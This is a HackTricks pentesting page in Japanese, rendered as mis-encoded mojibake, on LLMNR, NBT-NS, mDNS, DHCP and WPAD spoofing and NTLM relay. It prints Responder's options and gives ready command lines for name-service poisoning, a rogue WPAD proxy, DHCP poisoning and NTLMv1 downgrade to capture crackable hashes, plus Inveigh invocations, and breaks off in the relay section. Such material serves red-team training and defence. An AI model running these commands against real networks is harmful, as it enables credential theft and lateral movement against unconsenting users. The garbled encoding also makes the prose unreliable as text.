# LLMNRã€NBT-NSã€mDNS/DNSãŠã‚ˆã³WPADã®ã‚¹ãƒ—ãƒ¼ãƒ•ã‚£ãƒ³ã‚°ã¨ãƒªãƒ¬ãƒ¼ã‚¢ã‚¿ãƒƒã‚¯

<details>

<summary><strong>AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’ã‚¼ãƒ­ã‹ã‚‰ãƒ’ãƒ¼ãƒ­ãƒ¼ã¾ã§å­¦ã¶ã«ã¯</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWS Red Team Expertï¼‰</strong></a><strong>ã‚’ã”è¦§ãã ã•ã„ï¼</strong></summary>

HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹ä»–ã®æ–¹æ³•ï¼š

* **HackTricksã«ã‚ãªãŸã®ä¼šç¤¾ã‚’åºƒå‘Šã—ãŸã„**ã€ã¾ãŸã¯**HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ãŸã„**å ´åˆã¯ã€[**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**å…¬å¼PEASS & HackTricksã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’å…¥æ‰‹ã™ã‚‹
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ç™ºè¦‹ã—ã€ç‹¬å çš„ãª[**NFT**](https://opensea.io/collection/the-peass-family)ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã‚’ãƒã‚§ãƒƒã‚¯ã™ã‚‹
* ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã«**å‚åŠ ã™ã‚‹**ã‹ã€[**ãƒ†ãƒ¬ã‚°ãƒ©ãƒ ã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)ã‚’**ãƒ•ã‚©ãƒ­ãƒ¼ã™ã‚‹**ã€‚
* [**HackTricks**](https://github.com/carlospolop/hacktricks)ãŠã‚ˆã³[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®githubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ã€ã‚ãªãŸã®ãƒãƒƒã‚­ãƒ³ã‚°ã®ã‚³ãƒ„ã‚’**å…±æœ‰ã™ã‚‹**ã€‚

</details>

## ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ãƒ—ãƒ­ãƒˆã‚³ãƒ«

### LLMNRã€NBT-NSã€ãŠã‚ˆã³mDNS

Microsoftã‚·ã‚¹ãƒ†ãƒ ã¯ã€DNSãƒ«ãƒƒã‚¯ã‚¢ãƒƒãƒ—ãŒå¤±æ•—ã—ãŸå ´åˆã«ãƒ­ãƒ¼ã‚«ãƒ«ãƒ›ã‚¹ãƒˆè§£æ±ºã®ãŸã‚ã«Link-Local Multicast Name Resolutionï¼ˆLLMNRï¼‰ã¨NetBIOS Name Serviceï¼ˆNBT-NSï¼‰ã‚’ä½¿ç”¨ã—ã¾ã™ã€‚Apple Bonjourã¨Linuxã®ã‚¼ãƒ­ã‚³ãƒ³ãƒ•ã‚£ã‚®ãƒ¥ãƒ¬ãƒ¼ã‚·ãƒ§ãƒ³å®Ÿè£…ã¯ã€ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯å†…ã®ã‚·ã‚¹ãƒ†ãƒ ã‚’ç™ºè¦‹ã™ã‚‹ãŸã‚ã«Multicast DNSï¼ˆmDNSï¼‰ã‚’ä½¿ç”¨ã—ã¾ã™ã€‚ã“ã‚Œã‚‰ã®ãƒ—ãƒ­ãƒˆã‚³ãƒ«ã¯èªè¨¼ã•ã‚Œã¦ãŠã‚‰ãšã€UDPçµŒç”±ã§ãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ã‚’ãƒ–ãƒ­ãƒ¼ãƒ‰ã‚­ãƒ£ã‚¹ãƒˆã™ã‚‹ãŸã‚ã€æ”»æ’ƒè€…ã¯ãã‚Œã‚‰ã‚’æ‚ªç”¨ã—ã¦ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’æ‚ªæ„ã®ã‚ã‚‹ã‚µãƒ¼ãƒ“ã‚¹ã«èª˜å°ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

Responderã‚’ä½¿ç”¨ã—ã¦ã€ãƒ›ã‚¹ãƒˆãŒæ¤œç´¢ã™ã‚‹ã‚µãƒ¼ãƒ“ã‚¹ã‚’å½è£…ã—ã€å½ã®å¿œç­”ã‚’é€ä¿¡ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚\
[Responderã§ã‚µãƒ¼ãƒ“ã‚¹ã‚’å½è£…ã™ã‚‹æ–¹æ³•](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)ã«ã¤ã„ã¦ã®è©³ç´°ã¯ã“ã¡ã‚‰ã‚’èª­ã‚“ã§ãã ã•ã„ã€‚

### WPAD

å¤šãã®ãƒ–ãƒ©ã‚¦ã‚¶ã¯ã€ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã‹ã‚‰ãƒ—ãƒ­ã‚­ã‚·è¨­å®šã‚’èª­ã¿è¾¼ã‚€ãŸã‚ã«Web Proxy Auto-Discoveryï¼ˆWPADï¼‰ã‚’ä½¿ç”¨ã—ã¾ã™ã€‚WPADã‚µãƒ¼ãƒãƒ¼ã¯ã€ä»¥ä¸‹ã®ã„ãšã‚Œã‹ã‚’é€šã˜ã¦è­˜åˆ¥ã•ã‚ŒãŸå ´åˆã«ã€ç‰¹å®šã®URLï¼ˆä¾‹ï¼š_http://wpad.example.org/wpad.dat_ï¼‰ã‚’ä»‹ã—ã¦ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆãƒ—ãƒ­ã‚­ã‚·è¨­å®šã‚’æä¾›ã—ã¾ã™ï¼š

* DHCPã‚’ä½¿ç”¨ã—ã€ã‚³ãƒ¼ãƒ‰252ã‚¨ãƒ³ãƒˆãƒª[34](https://learning.oreilly.com/library/view/Network+Security+Assessment,+3rd+Edition/9781491911044/ch05.html#ch05fn41)ã‚’ä½¿ç”¨ã™ã‚‹
* ãƒ­ãƒ¼ã‚«ãƒ«ãƒ‰ãƒ¡ã‚¤ãƒ³ã§_wpad_ãƒ›ã‚¹ãƒˆåã‚’æ¤œç´¢ã™ã‚‹DNS
* DNSãƒ«ãƒƒã‚¯ã‚¢ãƒƒãƒ—ãŒå¤±æ•—ã—ãŸå ´åˆã®Microsoft LLMNRãŠã‚ˆã³NBT-NS

Responderã¯WPADæ”»æ’ƒã‚’è‡ªå‹•åŒ–ã—ã¾ã™â€”ãƒ—ãƒ­ã‚­ã‚·ã‚’å®Ÿè¡Œã—ã€DHCPã€DNSã€LLMNRã€ãŠã‚ˆã³NBT-NSã‚’ä»‹ã—ã¦ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã‚’æ‚ªæ„ã®ã‚ã‚‹WPADã‚µãƒ¼ãƒãƒ¼ã«èª˜å°ã—ã¾ã™ã€‚

## ãƒ—ãƒ­ãƒˆã‚³ãƒ«ãƒã‚¤ã‚ºãƒ‹ãƒ³ã‚°

### Responder - LLMNRã€NBT-NSãŠã‚ˆã³MDNS

> Responderã¯LLMNRã€NBT-NSãŠã‚ˆã³MDNSã®ãƒã‚¤ã‚ºãƒŠãƒ¼ã§ã™ã€‚ã“ã‚Œã¯ã€åå‰ã®ã‚µãƒ•ã‚£ãƒƒã‚¯ã‚¹ã«åŸºã¥ã„ã¦ç‰¹å®šã®NBT-NSï¼ˆNetBIOS Name Serviceï¼‰ã‚¯ã‚¨ãƒªã«å¿œç­”ã—ã¾ã™ï¼ˆå‚ç…§ï¼š[http://support.microsoft.com/kb/163409](http://support.microsoft.com/kb/163409)ï¼‰ã€‚ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ã¯ã€ãƒ„ãƒ¼ãƒ«ã¯SMBç”¨ã®File Server Serviceãƒªã‚¯ã‚¨ã‚¹ãƒˆã«ã®ã¿å¿œç­”ã—ã¾ã™ã€‚
>
> ã“ã‚Œã®èƒŒå¾Œã«ã‚ã‚‹ã‚³ãƒ³ã‚»ãƒ—ãƒˆã¯ã€ç§ãŸã¡ã®å›ç­”ã‚’ã‚¿ãƒ¼ã‚²ãƒƒãƒˆã«ã—ã€ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ä¸Šã§ã‚ˆã‚Šã‚¹ãƒ†ãƒ«ã‚¹ã«ã™ã‚‹ã“ã¨ã§ã™ã€‚ã“ã‚Œã¯ã¾ãŸã€æ­£å½“ãªNBT-NSã®å‹•ä½œã‚’å£Šã•ãªã„ã‚ˆã†ã«ã™ã‚‹ã®ã«ã‚‚å½¹ç«‹ã¡ã¾ã™ã€‚

* [**Responder**](https://github.com/lgandx/Responder)ã¯ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§kaliã«ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ã•ã‚Œã¦ãŠã‚Šã€è¨­å®šãƒ•ã‚¡ã‚¤ãƒ«ã¯\*\*`/etc/responder/Responder.conf` \*\*ã«ã‚ã‚Šã¾ã™ï¼ˆã“ã“ã§ãƒ­ãƒ¼ã‚°ã‚µãƒ¼ãƒãƒ¼ã‚’ç„¡åŠ¹ã«ã§ãã¾ã™ï¼‰
* **Responder**ã¯ç”»é¢ã«**ãƒãƒƒã‚·ãƒ¥ã‚’è¡¨ç¤ºã—**ã€`/usr/share/responder/logs`ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã«ã‚ã‚‹ãƒ›ã‚¹ãƒˆã”ã¨ã®**ãƒ­ã‚°**ãƒ•ã‚¡ã‚¤ãƒ«ã«**æ›¸ãè¾¼ã¿ã¾ã™**ã€‚ãƒãƒƒã‚·ãƒ¥ã¯`(MODULE_NAME)-(HASH_TYPE)-(CLIENT_IP).txt`ã®å½¢å¼ã§ä¿å­˜ã•ã‚Œã¾ã™
* ã“ã¡ã‚‰ã§**windows**ç”¨ã®Responderã‚’è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™[ã“ã¡ã‚‰](https://github.com/lgandx/Responder-Windows)
* Responderã¯**ipv4**ãŠã‚ˆã³**ipv6**ã§å‹•ä½œã—ã¾ã™

#### Responderã®ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿

Responderã¯ä»¥ä¸‹ã®ã‚ªãƒ—ã‚·ãƒ§ãƒ³ã‚’ã‚µãƒãƒ¼ãƒˆã—ã¦ã„ã¾ã™ï¼š
```
--version           show program's version number and exit
-h, --help          show this help message and exit
-A, --analyze       Analyze mode. This option allows you to see NBT-NS,
BROWSER, LLMNR requests without responding.
-I eth0, --interface=eth0
Network interface to use, you can use 'ALL' as a
wildcard for all interfaces
-i 10.0.0.21, --ip=10.0.0.21
Local IP to use (only for OSX)
-6 2002:c0a8:f7:1:3ba8:aceb:b1a9:81ed, --externalip6=2002:c0a8:f7:1:3ba8:aceb:b1a9:81ed
Poison all requests with another IPv6 address than
Responder's one.
-e 10.0.0.22, --externalip=10.0.0.22
Poison all requests with another IP address than
Responder's one.
-b, --basic         Return a Basic HTTP authentication. Default: NTLM
-r, --wredir        Enable answers for netbios wredir suffix queries.
Answering to wredir will likely break stuff on the
network. Default: False
-d, --DHCP          Enable answers for DHCP broadcast requests. This
option will inject a WPAD server in the DHCP response.
Default: False
-D, --DHCP-DNS      This option will inject a DNS server in the DHCP
response, otherwise a WPAD server will be added.
Default: False
-w, --wpad          Start the WPAD rogue proxy server. Default value is
False
-u UPSTREAM_PROXY, --upstream-proxy=UPSTREAM_PROXY
Upstream HTTP proxy used by the rogue WPAD Proxy for
outgoing requests (format: host:port)
-F, --ForceWpadAuth Force NTLM/Basic authentication on wpad.dat file
retrieval. This may cause a login prompt. Default:
False
-P, --ProxyAuth     Force NTLM (transparently)/Basic (prompt)
authentication for the proxy. WPAD doesn't need to be
ON. This option is highly effective when combined with
-r. Default: False
--lm                Force LM hashing downgrade for Windows XP/2003 and
earlier. Default: False
--disable-ess       Force ESS downgrade. Default: False
-v, --verbose       Increase verbosity.
```
<details>

<summary>Responder Params</summary>

* `-A` ãƒ•ãƒ©ã‚°ã¯**åˆ†æãƒ¢ãƒ¼ãƒ‰**ã«å…¥ã‚Šã€ç’°å¢ƒå†…ã®NBT-NSã€BROWSERã€LLMNRãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’è¦‹ã‚‹ã“ã¨ãŒã§ãã¾ã™ãŒã€ãƒ¬ã‚¹ãƒãƒ³ã‚¹ã‚’æ±šæŸ“ã—ã¾ã›ã‚“ã€‚
* ã‚¤ãƒ³ã‚¿ãƒ¼ãƒ•ã‚§ãƒ¼ã‚¹ã¾ãŸã¯IPã®ã©ã¡ã‚‰ã‹ã‚’å¿…ãšæŒ‡å®šã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚
* `-wf` ã¯WPADãƒ­ãƒ¼ã‚°ãƒ—ãƒ­ã‚­ã‚·ã‚µãƒ¼ãƒãƒ¼ã‚’èµ·å‹•ã—ã¾ã™ã€‚
* `-f` ã¯ãƒªãƒ¢ãƒ¼ãƒˆãƒ›ã‚¹ãƒˆã®ã‚ªãƒšãƒ¬ãƒ¼ãƒ†ã‚£ãƒ³ã‚°ã‚·ã‚¹ãƒ†ãƒ ã¨ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã‚’æŒ‡ç´‹èªè¨¼ã—ã‚ˆã†ã¨ã—ã¾ã™ã€‚
* `-v` ãƒ•ãƒ©ã‚°ã‚’ä½¿ç”¨ã—ã¦è©³ç´°åº¦ã‚’ä¸Šã’ã¾ã™ï¼ˆã‚³ãƒ³ã‚½ãƒ¼ãƒ«ã«å¤šãã®è¿½åŠ ãƒ‡ãƒ¼ã‚¿ãŒè¡¨ç¤ºã•ã‚Œã¾ã™ï¼‰ã€‚
* `-F` ã‚„ `-P` ã®ã‚ˆã†ãªã‚ªãƒ—ã‚·ãƒ§ãƒ³ã¯NTLMã¾ãŸã¯Basicèªè¨¼ã‚’å¼·åˆ¶ã—ã€ãƒ—ãƒ­ã‚­ã‚·èªè¨¼ã‚’å¼·åˆ¶ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ãŒã€ãƒ­ã‚°ã‚¤ãƒ³ãƒ—ãƒ­ãƒ³ãƒ—ãƒˆãŒè¡¨ç¤ºã•ã‚Œã‚‹å¯èƒ½æ€§ãŒã‚ã‚‹ãŸã‚ã€æ§ãˆã‚ã«ä½¿ç”¨ã™ã‚‹ã¹ãã§ã™ã€‚
* `-w` ãƒ•ãƒ©ã‚°ã¯çµ„ã¿è¾¼ã¿ã®WPADãƒ—ãƒ­ã‚­ã‚·ã‚µãƒ¼ãƒãƒ¼ã‚’åˆ©ç”¨ã—ã¾ã™ã€‚ã“ã‚Œã¯ç‰¹ã«å¤§è¦æ¨¡ãªçµ„ç¹”ã§éå¸¸ã«åŠ¹æœçš„ã§ã‚ã‚Šã€[è‡ªå‹•æ¤œå‡ºè¨­å®š](https://docs.microsoft.com/en-us/internet-explorer/ie11-deploy-guide/auto-detect-settings-for-ie11)ãŒæœ‰åŠ¹ã«ãªã£ã¦ã„ã‚‹Internet Explorerã‚’èµ·å‹•ã™ã‚‹ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ã™ã¹ã¦ã®HTTPãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’ã‚­ãƒ£ãƒ—ãƒãƒ£ã—ã¾ã™ã€‚

</details>

#### Responderã®å®Ÿè¡Œ

ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã®Responderå‹•ä½œã‚’å®Ÿè¡Œã™ã‚‹ã«ã¯ã€æ¬¡ã®ã‚³ãƒãƒ³ãƒ‰ã‚’å®Ÿè¡Œã—ã¾ã™ã€‚
```bash
responder -I <Iface> #Default conf
responder -I <Iface> -P -r -v #More chances but might break things
```
é¢ç™½ã„ãƒ†ã‚¯ãƒ‹ãƒƒã‚¯ã¯ã€å¯èƒ½ãªå ´åˆã«NTLMèªè¨¼ã‚’ãƒ€ã‚¦ãƒ³ã‚°ãƒ¬ãƒ¼ãƒ‰ã™ã‚‹ãŸã‚ã«responderã‚’ä½¿ç”¨ã™ã‚‹ã“ã¨ã§ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€**ç°¡å˜ã«ã‚¯ãƒ©ãƒƒã‚¯ã§ãã‚‹**NTLMv2ã®ä»£ã‚ã‚Šã«**NTLMv1ã®ãƒãƒ£ãƒ¬ãƒ³ã‚¸ã¨ãƒ¬ã‚¹ãƒãƒ³ã‚¹ã‚’ã‚­ãƒ£ãƒ—ãƒãƒ£ã™ã‚‹**ã“ã¨ãŒã§ãã¾ã™[**ã“ã®ã‚¬ã‚¤ãƒ‰ã«å¾“ã£ã¦**](../../windows-hardening/ntlm/#ntlmv1-attack)**ã€‚**
```bash
#Remember that in order to crack NTLMv1 you need to set Responder challenge to "1122334455667788"
responder -I <Iface> --lm --disable-ess #Downgrade NTLM authntication if possible and force ESS downgrade
```
**ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆ**ã§ã¯ã€**WPADã®ãªã‚Šã™ã¾ã—ã¯å®Ÿè¡Œã•ã‚Œã¾ã›ã‚“ãŒ**ã€ä»¥ä¸‹ã®æ“ä½œã§å®Ÿè¡Œã§ãã¾ã™:
```bash
responder -I <Iface> --wpad
```
NetBIOSãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’**ã‚ãªãŸã®IP**ã§è§£æ±ºã™ã‚‹ã“ã¨ã‚‚ã§ãã¾ã™ã€‚ãã—ã¦ã€**èªè¨¼ãƒ—ãƒ­ã‚­ã‚·**ã‚’ä½œæˆã—ã¾ã™ï¼š
```bash
responder.py -I <interface> -Pv
```
```markdown
NTLMãƒãƒƒã‚·ãƒ¥ã‚’å‚å—ã™ã‚‹ã“ã¨ã¯é€šå¸¸ã§ãã¾ã›ã‚“ãŒã€**NTLMãƒãƒ£ãƒ¬ãƒ³ã‚¸ã¨ãƒ¬ã‚¹ãƒãƒ³ã‚¹**ã‚’ç°¡å˜ã«å–å¾—ã—ã€ä¾‹ãˆã°_**john**_ã®ã‚ªãƒ—ã‚·ãƒ§ãƒ³`--format=netntlmv2`ã‚’ä½¿ç”¨ã—ã¦**ã‚¯ãƒ©ãƒƒã‚¯**ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã®_**Responder**_ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ã®**ãƒ­ã‚°ã¨ãƒãƒ£ãƒ¬ãƒ³ã‚¸**ã¯ã€kaliã§ã¯`/usr/share/responder/logs`ã§è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

#### Responder - DHCPãƒã‚¤ã‚ºãƒ‹ãƒ³ã‚°

Windowsã¯NetBIOSã€WINSã€WPADè¨­å®šãªã©ã€ã„ãã¤ã‹ã®ã‚«ã‚¹ã‚¿ãƒ DHCPã‚ªãƒ—ã‚·ãƒ§ãƒ³ã‚’ä½¿ç”¨ã—ã¾ã™ã€‚ãƒ¯ãƒ¼ã‚¯ã‚¹ãƒ†ãƒ¼ã‚·ãƒ§ãƒ³ãŒDHCPãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ä¿¡ã—ã¦ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯è¨­å®šã‚’å–å¾—ã™ã‚‹éš›ã€ã“ã‚Œã‚‰ã®è¿½åŠ è¨­å®šã¯DHCPå¿œç­”ã«å«ã¾ã‚Œã€ç°¡å˜ãªæ¥ç¶šã¨åå‰è§£æ±ºã‚’ä¿ƒé€²ã—ã¾ã™ã€‚

ãƒ¯ãƒ¼ã‚¯ã‚¹ãƒ†ãƒ¼ã‚·ãƒ§ãƒ³ã®ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯æ§‹æˆã«å¹²æ¸‰ã™ã‚‹ãŸã‚ã€DHCPå¿œç­”ã‚’ã‚¹ãƒ—ãƒ¼ãƒ•ã‚£ãƒ³ã‚°ã™ã‚‹ã“ã¨ã¯é›£ã—ã„å ´åˆãŒã‚ã‚Šã¾ã™ã€‚é€šå¸¸ã€ã‚¿ãƒ¼ã‚²ãƒƒãƒˆã‚µãƒ–ãƒãƒƒãƒˆã€DNSã‚µãƒ¼ãƒãƒ¼ã®ä½ç½®ã€ã‚¹ã‚¤ãƒƒãƒã€ãƒ«ãƒ¼ãƒ†ã‚£ãƒ³ã‚°ãƒ†ãƒ¼ãƒ–ãƒ«ã€ãƒ‰ãƒ¡ã‚¤ãƒ³ã€ãƒãƒƒãƒˆãƒã‚¹ã‚¯ã€DHCPã‚µãƒ¼ãƒãƒ¼ãªã©ã«ã¤ã„ã¦éå¸¸ã«è‰¯ã„çŸ¥è­˜ã‚’æŒã£ã¦ã„ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚**ã“ã‚Œã‚‰ã®è¨­å®šã§é–“é•ã„ãŒã‚ã‚‹ã¨ã€ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã«éšœå®³ãŒç™ºç”Ÿã—ã¾ã™ã€‚**

ã—ã‹ã—ã€DHCPå¿œç­”ã‚’ã‚¹ãƒ—ãƒ¼ãƒ•ã‚£ãƒ³ã‚°ã™ã‚‹ã“ã¨ã«ã¯ãƒ¦ãƒ‹ãƒ¼ã‚¯ãªåˆ©ç‚¹ãŒã‚ã‚Šã¾ã™ã€‚**ARPãƒã‚¤ã‚ºãƒ‹ãƒ³ã‚°ã‚ˆã‚Šã‚‚ç¢ºå®Ÿã«ã‚¹ãƒ†ãƒ«ã‚¹æ€§ãŒé«˜ã„ã§ã™**ã€‚ä¸€ã¤ã®ãƒ¦ãƒ‹ã‚­ãƒ£ã‚¹ãƒˆå¿œç­”ã§è¢«å®³è€…ã®ãƒ«ãƒ¼ãƒ†ã‚£ãƒ³ã‚°æƒ…å ±ã‚’æ°¸ç¶šçš„ã«æ±šæŸ“ã™ã‚‹ã“ã¨ãŒã§ãã€ã¾ãŸã€è¤‡æ•°ã®DHCPã‚µãƒ¼ãƒãƒ¼ãŒãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ä¸Šã§å‹•ä½œã—ã¦ã„ã‚‹ã®ã‚’è¦‹ã‚‹ã“ã¨ãŒä¸€èˆ¬çš„ã§ã™ã€‚ãƒ¦ãƒ‹ã‚­ãƒ£ã‚¹ãƒˆDHCPå¿œç­”ã¯æ¤œå‡ºãŒã‚ˆã‚Šè¤‡é›‘ã§ã€ã„ãã¤ã‹ã®ã‚¹ã‚¤ãƒƒãƒã¯DHCPã‚¹ãƒŒãƒ¼ãƒ”ãƒ³ã‚°ã‚’é˜²ããŸã‚ã®ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£è¨­å®šã‚’æä¾›ã—ã¦ã„ã¾ã™ãŒã€ã“ã‚Œã‚‰ã®è¨­å®šã¯ç›´æ„Ÿçš„ã§ã¯ãªãã€æœ‰åŠ¹ã«ã•ã‚ŒãŸã¨ãã«ã—ã°ã—ã°èª¤è¨­å®šã•ã‚Œã¦ã„ã¾ã™ã€‚

> ã“ã®æ”»æ’ƒã¯éå¸¸ã«åŠ¹æœçš„ã§ã€ç¢ºå®Ÿã«NTLMv1/2ãƒãƒƒã‚·ãƒ¥ã‚’å–å¾—ã§ãã¾ã™ã€‚
```
```bash
./Responder.py -I eth0 -Pdv
```
#### Responder - è³‡æ ¼æƒ…å ±ã®ã‚­ãƒ£ãƒ—ãƒãƒ£

Responderã¯**è¨€åŠã•ã‚ŒãŸãƒ—ãƒ­ãƒˆã‚³ãƒ«ã‚’ä½¿ç”¨ã™ã‚‹ã™ã¹ã¦ã®ã‚µãƒ¼ãƒ“ã‚¹ã‚’å½è£…ã—ã¾ã™**ã€‚ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒã“ã‚Œã‚‰ã®ãƒ—ãƒ­ãƒˆã‚³ãƒ«ã‚’ä½¿ç”¨ã—ã¦è§£æ±ºã•ã‚Œã‚‹ã‚µãƒ¼ãƒ“ã‚¹ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ã‚ˆã†ã¨ã™ã‚‹ã¨ã€**Responderã«å¯¾ã—ã¦èªè¨¼ã‚’è©¦ã¿ã¾ã™**ãŒã€Responderã¯"è³‡æ ¼æƒ…å ±"ï¼ˆãŠãã‚‰ã**NTLMv2ãƒãƒ£ãƒ¬ãƒ³ã‚¸/ãƒ¬ã‚¹ãƒãƒ³ã‚¹**ï¼‰ã‚’**ã‚­ãƒ£ãƒ—ãƒãƒ£**ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼š

NetNTLMv1ã«ãƒ€ã‚¦ãƒ³ã‚°ãƒ¬ãƒ¼ãƒ‰ã‚’è©¦ã¿ã‚‹ã‹ã€ESSã‚’ç„¡åŠ¹ã«ã™ã‚‹ã“ã¨ã‚‚å¯èƒ½ã§ã™ã€‚

![](<../../.gitbook/assets/poison (1) (1) (1).jpg>)

### Inveigh - C#/PowerShell Responder

> Inveighã¯ã€Windowsã‚·ã‚¹ãƒ†ãƒ ã«é™å®šã•ã‚Œã¦ã„ã‚‹ãƒšãƒãƒˆãƒ¬ãƒ¼ã‚·ãƒ§ãƒ³ãƒ†ã‚¹ã‚¿ãƒ¼/ãƒ¬ãƒƒãƒ‰ãƒãƒ¼ãƒ ã®æ”¯æ´ã‚’ç›®çš„ã¨ã—ãŸPowerShell ADIDNS/LLMNR/NBNS/mDNS/DNSã‚¹ãƒ—ãƒ¼ãƒ•ã‚£ãƒ³ã‚°ãŠã‚ˆã³ãƒãƒ³ãƒ»ã‚¤ãƒ³ãƒ»ã‚¶ãƒ»ãƒŸãƒ‰ãƒ«ãƒ„ãƒ¼ãƒ«ã§ã™ã€‚

[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh)ã¯PowerShellã‚¹ã‚¯ãƒªãƒ—ãƒˆã§ã—ãŸãŒã€ç¾åœ¨ã¯Responderã¨åŒã˜ä¸»è¦æ©Ÿèƒ½ã‚’æŒã¤C#ãƒã‚¤ãƒŠãƒªã§ã™ã€‚ã™ã¹ã¦ã®ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã¨ä½¿ç”¨æ–¹æ³•ã‚’ãƒªã‚¹ãƒˆã—ãŸ[**wiki**](https://github.com/Kevin-Robertson/Inveigh/wiki/Parameters)ãŒã‚ã‚Šã¾ã™ã€‚\
åˆ¥ã®ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã¯[**InveighZero**](https://github.com/Kevin-Robertson/InveighZero)ã§è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

![](../../.gitbook/assets/45662029-1b5e6300-bace-11e8-8180-32f8d377d48b.png)

ã¾ãŸã¯ã€ã‚ˆã‚Šå¤šãã®ã‚ªãƒ—ã‚·ãƒ§ãƒ³ã§å®Ÿè¡Œã—ã¾ã™ï¼š
```powershell
Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
```
ã¾ãŸã¯ã€C#ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã‚’å®Ÿè¡Œã—ã¾ã™ï¼š
```bash
Inveigh.exe
```
## NTLMãƒªãƒ¬ãƒ¼æ”»æ’ƒ

ã“ã®æ”»æ’ƒã¯ã€å†…éƒ¨ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ä¸Šã®**SMBèªè¨¼ã‚»ãƒƒã‚·ãƒ§ãƒ³**ã‚’**ã‚¿ãƒ¼ã‚²ãƒƒãƒˆãƒã‚·ãƒ³**ã«ãƒªãƒ¬ãƒ¼ã—ã¾ã™ã€‚èªè¨¼**ã‚»ãƒƒã‚·ãƒ§ãƒ³ãŒæˆåŠŸã™ã‚‹**ã¨ã€è‡ªå‹•çš„ã«**ã‚·ã‚¹ãƒ†ãƒ ** **ã‚·ã‚§ãƒ«**ã«å…¥ã‚Šã¾ã™ã€‚ãƒªãƒ¬ãƒ¼ã•ã‚ŒãŸèªè¨¼ã¯ã€ãƒªãƒ¬ãƒ¼ã•ã‚ŒãŸãƒ›ã‚¹ãƒˆã«å¯¾ã—ã¦ãƒ­ãƒ¼ã‚«ãƒ«ç®¡ç†è€…ã‚¢ã‚¯ã‚»ã‚¹æ¨©ã‚’æŒã¤**ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‹ã‚‰ã®ã‚‚ã®ã§ã‚ã‚‹å¿…è¦ãŒã‚ã‚Š**ã€**SMBç½²åãŒç„¡åŠ¹ã«ãªã£ã¦ã„ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™**ã€‚

### 445ã®è»¢é€ã¨ãƒˆãƒ³ãƒãƒªãƒ³ã‚°

{% hint style="warning" %}
